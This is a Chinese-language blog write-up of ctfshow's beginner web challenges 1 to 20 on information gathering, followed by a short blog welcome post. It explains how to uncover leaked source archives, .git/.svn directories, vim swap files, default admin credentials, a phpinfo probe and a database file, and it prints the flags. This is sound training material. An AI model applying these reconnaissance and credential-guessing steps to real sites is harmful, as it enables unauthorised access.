      <title>ctfshow web入门（信息收集1-20）</title>
      <link href="2020/11/27/ctfshow/"/>
      <url>2020/11/27/ctfshow/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p><strong>解题思路：</strong>F12打开开发调试工具或者直接查看源代码，即可得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201127232436.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;b971df3e-4760-42fd-ab0c-fe7bd9c644c7&#125; </span><br></pre></td></tr></table></figure><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p><strong>解题思路：</strong>ctrl+u或者在url前加上view-source:查看网页源代码即可得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201127232837.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1d08f14d-148e-4f00-ab1a-69663bd252b8&#125;</span><br></pre></td></tr></table></figure><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><strong>题目提示：</strong>没思路的时候抓个包看看，可能会有意外收获。<br><strong>解题思路：</strong>根据题目提示打开Burp Suite，抓包以后发包得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201127233731.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;4b520f4a-4fc9-4050-b999-db0dcaaf6066&#125;</span><br></pre></td></tr></table></figure><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p><strong>题目提示：</strong>总有人把后台地址写入robots，帮黑阔大佬们引路。<br><strong>解题思路：</strong>按照题目提示访问url/robots.txt,后显示入下图。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201127234215.png"></p><p>提示我们访问url/flagishere.txt,得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201127234433.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;0c4770da-9844-40dd-b9a0-5772640afb32&#125;</span><br></pre></td></tr></table></figure><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><strong>题目提示：</strong>phps源码泄露有时候能帮上忙。<br><strong>解题思路：</strong>访问url/index.phps，如下图。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201127235839.png"></p><p>下载index.phps文件，得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128000048.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;24a8208e-378b-4d7d-b30f-3bdc0a4d2a7b&#125;</span><br></pre></td></tr></table></figure><p>本题考点：关于phps，phps其实就是php的源代码文件，通常用于提供给用户查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。（转自<a href="https://www.d1a0.cn/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/#web5">大周师傅的博客</a>）</p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><strong>题目提示：</strong>解压源码到当前目录，测试正常，收工。<br><strong>解题思路：</strong>访问url/<a href="http://www.zip,如下图/">www.zip，如下图</a></p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128002035.png"></p><p>下载后解压，打开fl000g.txt，得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;flag_here&#125;</span><br></pre></td></tr></table></figure><p><strong>本题考点</strong>：源代码压缩包泄露。</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><strong>题目提示：</strong>版本控制很重要，但不要部署到生产环境更重要。</p><p><strong>解题思路：</strong>看到版本控制很容易就想到git泄露，访问url/.git，得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128002627.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;b4c19a3c-96c3-4f8b-8c61-2582d4468774&#125; </span><br></pre></td></tr></table></figure><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><strong>题目提示</strong>：版本控制很重要，但不要部署到生产环境更重要。</p><p>提示和web7一样，除了git泄露，还存在svn泄露，直接访问url/.svn得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128003408.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;0739d747-143b-4383-8e32-e35ee8d39a43&#125; </span><br></pre></td></tr></table></figure><p><strong>相关知识点：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git与svn的区别：</span><br><span class="line">1.git是分布式的，svn是集中式的</span><br><span class="line">2.git将每个历史版本都存储完整的文件，svn只是存储差异的文件，历史版本不可恢复</span><br><span class="line">3.git可以离线完成大部分的操作，svn不可以离线操作</span><br><span class="line">4.git可以实现分支合并</span><br><span class="line">5.git可以修改和撤销修改历史版本</span><br><span class="line">6.git速度快，效率高</span><br><span class="line">7.git有本地仓库</span><br><span class="line">8.git以元数据方式存储，svn以原始文件存储</span><br></pre></td></tr></table></figure><p><strong>相关链接：</strong><a href="https://www.cnblogs.com/Sungeek/p/9152223.html">SVN与Git比较的优缺点差异</a></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><strong>题目提示：</strong>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了。</p><p><strong>解题思路：</strong>本题考查的是Vim缓存，访问url/index.php.swp,如下图。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128092152.png"></p><p>下载文件后，打开得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;9170059d-e21d-44c2-a20f-bb6fea146fda&#125;</span><br></pre></td></tr></table></figure><p><strong>本题考点：</strong></p><p><strong>Vim缓存：</strong>临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。(转自<a href="https://blog.csdn.net/a597934448/article/details/105431367">csdn</a>)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp</span><br><span class="line">第二次意外退出后，文件名为.index.php.swo</span><br><span class="line">第三次产生的缓存文件则为 .index.php.swn</span><br><span class="line">注意：index前有 &quot; . &quot;</span><br></pre></td></tr></table></figure><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p><strong>题目提示：</strong>cookie 只是一块饼干，不能存放任何隐私数据。</p><p><strong>解题思路：</strong>根据题目提示，查看网页响应头中的cookie，url解码后得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128095732.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;45cdcafa-4438-419b-92df-35269b01ab12&#125;</span><br></pre></td></tr></table></figure><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p><strong>题目提示：</strong>域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息。</p><p><strong>解题思路：</strong>根据题目提示查看域名解析。以下提供两种解题思路：</p><h2 id="1-使用nslookup命令查看DNS记录"><a href="#1-使用nslookup命令查看DNS记录" class="headerlink" title="1.使用nslookup命令查看DNS记录"></a>1.使用nslookup命令查看DNS记录</h2><p>nslookup -qt=txt ctfshow.com，得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128101203.png"></p><h3 id="nslookup命令详解"><a href="#nslookup命令详解" class="headerlink" title="nslookup命令详解"></a>nslookup命令详解</h3><h4 id="1-nslookup作用"><a href="#1-nslookup作用" class="headerlink" title="(1)nslookup作用"></a>(1)nslookup作用</h4><p>nslookup用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p><h4 id="2-nslookup命令使用"><a href="#2-nslookup命令使用" class="headerlink" title="(2)nslookup命令使用"></a>(2)nslookup命令使用</h4><h5 id="a-直接查询"><a href="#a-直接查询" class="headerlink" title="a.直接查询"></a>a.直接查询</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup domain [dns-server]</span><br><span class="line">  &#x2F;&#x2F;如果没有指定dns服务器，就采用系统默认的dns服务器。</span><br></pre></td></tr></table></figure><h5 id="b-查询其他记录"><a href="#b-查询其他记录" class="headerlink" title="b. 查询其他记录"></a>b. 查询其他记录</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup -qt &#x3D; type domain [dns-server]</span><br><span class="line">type:</span><br><span class="line">    A --&gt;地址记录</span><br><span class="line">    AAAA   --&gt;地址记录</span><br><span class="line">    AFSDB Andrew    --&gt;文件系统数据库服务器记录</span><br><span class="line">    ATMA --&gt;ATM地址记录</span><br><span class="line">    CNAME   --&gt;别名记录</span><br><span class="line">    HINHO  --&gt;硬件配置记录，包括CPU、操作系统信息 </span><br><span class="line">    ISDN   --&gt;域名对应的ISDN号码</span><br><span class="line">    MB   --&gt;存放指定邮箱的服务器</span><br><span class="line">    MG    --&gt;邮件组记录</span><br><span class="line">    MINFO   --&gt;邮件组和邮箱的信息记录</span><br><span class="line">    MR   --&gt;改名的邮箱记录</span><br><span class="line">    MX   --&gt;邮件服务器记录</span><br><span class="line">    NS  --&gt; 名字服务器记录</span><br><span class="line">    PTR    -&gt;反向记录</span><br><span class="line">    RP    --&gt;负责人记录</span><br><span class="line">    RT  --&gt;路由穿透记录</span><br><span class="line">    SRV    --&gt;TCP服务器信息记录</span><br><span class="line">    TXT   --&gt;域名对应的文本信息</span><br><span class="line">    X25  --&gt;域名对应的X.25地址记录</span><br></pre></td></tr></table></figure><h5 id="c-查询更具体的信息"><a href="#c-查询更具体的信息" class="headerlink" title="c. 查询更具体的信息"></a>c. 查询更具体的信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup -d [其他参数] domain [dns-server]     </span><br><span class="line">&#x2F;&#x2F;只要在查询的时候，加上-d参数，即可查询域名的缓存</span><br></pre></td></tr></table></figure><h2 id="2-使用阿里云DNS检测-推荐使用"><a href="#2-使用阿里云DNS检测-推荐使用" class="headerlink" title="2.使用阿里云DNS检测(推荐使用)"></a>2.使用<a href="https://zijian.aliyun.com/">阿里云DNS检测</a>(推荐使用)</h2><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128102829.png"></p><p>从解析结果中得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;just_seesee&#125;</span><br></pre></td></tr></table></figure><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><strong>题目提示：</strong>有时候网站上的公开信息，就是管理员常用密码。<br><strong>解题思路：</strong>看到网页最下方。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128103655.png"></p><p>直登录后台url/admin，用户名为admin，密码为页面最下方的电话号码。登录后台后得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;5493f4d5-e5bc-471b-b8f4-f7a030d68b59&#125;</span><br></pre></td></tr></table></figure><p><strong>补充说明：</strong>后面有看其他师傅的wp，访问url/robots.txt可以得到管理员用户名。</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><strong>题目提示：</strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码。<br><strong>解题思路：</strong>网页最下方的document可以点击。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128105013.png"></p><p>打开document，看到管理员后台登录信息，登录后台得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128105031.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;f295e88c-858e-44c7-85ed-4484293006ac&#125;</span><br></pre></td></tr></table></figure><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p><strong>题目提示：</strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人。</p><p><strong>解题思路：</strong>这题我是看了其他师傅的wp才做出来的。</p><ol><li>访问url/editor。</li><li>点击插入文件（第二排倒数第十个）选择文件空间。</li><li>在tmp/html/nothinghere文件夹中找到fl000g,txt。</li><li>访问url/nothinghere/fl000g.txt得到flag。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128111413.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;2b7de78b-8dd4-4207-840b-a7c8fb2fd53f&#125;</span><br></pre></td></tr></table></figure><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p><strong>题目提示：</strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果。</p><p><strong>解题思路：</strong>网页最下方写着qq邮箱。访问url/admin。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128112156.png"></p><p>一开始以为用户名是admin，密码是qq邮箱。后来发现有忘记密码选项。提示询问管理员所在城市。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128112253.png"></p><p>通过qq邮箱进行搜索，发现管理员所在地址为西安。<img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128112612.png"></p><p>输入地区重置密码。重新登录管理员后台，用户名为admin，密码为admin7789，得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;a60898ad-0dda-4a16-86af-30959dd0b7c7&#125;</span><br></pre></td></tr></table></figure><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p><strong>题目提示：</strong>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露。</p><p><strong>解题思路：</strong>根据题意，访问url/tz.php。找到PHPinfo后点击进去。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128113231.png"></p><p>在phpinfo页面中搜索flag，得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;bd4bce2a-5ecd-4821-9a42-232b7d54083b&#125; </span><br></pre></td></tr></table></figure><p><strong>本题考点：</strong>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p><p><strong>补充说明：</strong>看了别的师傅的wp才做出来的，一开始以为“tz.php”中的“tz”是哪个英文单词的缩写，后来问了出题人，“tz”其实是”探针“的简写。</p><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p><strong>题目信息：</strong>透过重重缓存，查找到ctfer.com的真实IP。</p><p>看了其他的师傅的一些wp，他们通过在线网站查寻域名解析记录的方式得到的真实IP。我是使用kali里面Maltego跑出的真实IP。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">111.231.70.44</span><br></pre></td></tr></table></figure><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p><strong>题目提示：</strong>不要着急，休息，休息一会儿，玩101分给你flag。</p><p><strong>解题思路：</strong>查看js文件。<img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128115653.png">找到函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="built_in">window</span>.confirm(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Unicode解码：你赢了，去幺幺零点皮爱吃皮看看。根据提示访问url/110.php得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;50fa931d-0653-4bb2-8eb5-97756673b8c9&#125; </span><br></pre></td></tr></table></figure><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p><strong>题目提示：</strong>密钥什么的，就不要放在前端了。</p><p><strong>解题思路：</strong>查看网页源代码，在最下方发现。<img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128121848.png"></p><p>用Burp Suite抓包重发，得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201128121956.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;4022663d-734e-4ae0-96b4-b562842e0913&#125;</span><br></pre></td></tr></table></figure><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p><strong>题目提示：</strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤。</p><p><strong>解题思路：</strong>这个题是归到爆破了我记得，但是这种类型的年代久远了，用御剑和sqlmap都爆破不出来，是在db目录下的一个mdb文件，/db/db.mdb，下载这个数据库文件后打开就有flag了。（转自<a href="https://www.d1a0.cn/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/#web20">大周师傅博客</a>）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;ctfshow_old_database&#125;</span><br></pre></td></tr></table></figure><h1 id="心得与感悟"><a href="#心得与感悟" class="headerlink" title="心得与感悟"></a>心得与感悟</h1><p>花了一个上午的时间重做了20道题，并写出wp。中国有句到老话叫做：温故而知新，重做一遍后，我在写wp的过程中又学到了不少知识，这些都是很好、很典型的的入门级题目。</p><p><strong>ctfshow平台地址：</strong><a href="https://ctf.show/">https://ctf.show/</a></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/11/21/hello-world/"/>
      <url>2020/11/21/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到我的博客！"><a href="#欢迎来到我的博客！" class="headerlink" title="欢迎来到我的博客！"></a>欢迎来到我的博客！</h1><h2 id="这是哪里？"><a href="#这是哪里？" class="headerlink" title="这是哪里？"></a>这是哪里？</h2><p>这是Penguin的博客，主要用来记录ctf学习和解题思路，同时还会记录一些与编程相关的学习笔记。</p><h2 id="博客说明"><a href="#博客说明" class="headerlink" title="博客说明"></a>博客说明</h2><p>此博客耗时三天搭建完成，这次搭建博客的经历，让我初识了vuepress和hugo两种框架。同时这也是我第一次使用markdown语法来书写博客，后续我会开放博客的更多功能。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
